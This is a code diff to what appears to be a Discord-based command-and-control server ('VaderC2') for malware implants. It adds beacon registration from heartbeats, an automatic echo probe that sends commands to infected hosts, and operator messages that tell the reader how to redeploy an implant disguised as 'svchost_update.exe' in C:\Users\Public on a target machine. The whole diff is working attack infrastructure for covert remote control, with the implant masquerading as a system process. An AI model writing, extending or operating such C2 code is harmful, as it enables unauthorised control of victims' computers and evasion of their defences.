@@ -259,8 +259,51 @@ class VaderC2(discord.Client):
                         await self.send_command(session_id, cmd)
 
         elif msg_type == "heartbeat":
-            if session_id in self.sessions:
+            if session_id not in self.sessions:
+                self.sessions[session_id] = Session(session_id, hostname, "heartbeat-only")
+                self.sessions[session_id].ua_probed = False
+                self.log(f"BEACON ONLINE: {session_id} @ {hostname}")
+                asyncio.ensure_future(self._ua_probe(session_id, hostname))
+            else:
                 self.sessions[session_id].last_seen = datetime.now(timezone.utc)
+                self.log(f"HB [{session_id}] {hostname}")
+
+    async def _ua_probe(self, session_id, hostname):
+        """Send echo probe to new beacon. No reply in 20s = UA bug (old binary)."""
+        await asyncio.sleep(5)
+        channel = self.get_channel(self.c2_channel_id)
+        probe_cmd = json.dumps({
+            "type": "cmd",
+            "session": session_id,
+            "command": "echo UA_PROBE_OK"
+        })
+        await channel.send(probe_cmd)
+        self.log(f"UA PROBE sent → {session_id}")
+
+        await asyncio.sleep(20)
+
+        sess = self.sessions.get(session_id)
+        got_reply = sess and any(
+            "UA_PROBE_OK" in e.get("content", "")
+            for e in getattr(sess, "log", [])
+            if e.get("dir") == "in"
+        )
+        if got_reply:
+            await channel.send(
+                f"```diff\n+ BEACON {session_id} ({hostname}) — NEW BINARY ✅\n"
+                f"+ UA probe replied — can receive commands\n```"
+            )
+            self.log(f"UA PROBE PASS: {session_id} — new binary confirmed")
+        else:
+            await channel.send(
+                f"```diff\n- BEACON {session_id} ({hostname}) — OLD BINARY ❌\n"
+                f"- UA probe no reply — Mozilla/5.0 bug — cannot receive commands\n"
+                f"- FIX: deploy agent/dist/svchost_update.exe to target machine\n"
+                f"- CMD: taskkill /IM svchost_update.exe /F\n"
+                f"-      copy new binary → C:\\Users\\Public\\svchost_update.exe\n"
+                f"-      start /B C:\\Users\\Public\\svchost_update.exe\n```"
+            )
+            self.log(f"UA PROBE FAIL: {session_id} — old binary (UA bug)")
 
     async def handle_operator_command(self, content, message):
         parts = content.split(maxsplit=2)
